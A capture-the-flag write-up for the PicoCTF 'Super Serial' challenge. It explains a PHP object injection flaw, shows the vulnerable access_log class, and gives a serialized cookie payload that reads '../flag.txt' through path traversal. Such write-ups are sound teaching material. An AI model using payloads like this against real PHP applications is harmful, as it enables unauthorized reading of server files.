PicoCTF: Super Serial

This challenge involves exploiting a PHP Object Injection vulnerability. The application uses `serialize()` and `unserialize()` on user-controlled data without proper validation.

Reconnaissance

Upon visiting the site, we see a login form. Checking the source code reveals a hint about `robots.txt`.

User-agent: *
Disallow: /admin.phps
Disallow: /super-secret-flag.txt

We can try to access `index.phps` to see the source code of the index page.

Exploitation

The code reveals a class `access_log` with a `__toString` method that reads a file. If we can inject a serialized object of this class, we can trigger the file read.

class access_log {
    public $log_file;

    function __construct($lf) {
        $this->log_file = $lf;
    }

    function __toString() {
        return read_file($this->log_file);
    }
}

We craft a payload to read `../flag.txt`.

Payload

O:10:"access_log":1:{s:8:"log_file";s:11:"../flag.txt";}

Encoding this payload and sending it via the cookie results in the flag being printed.
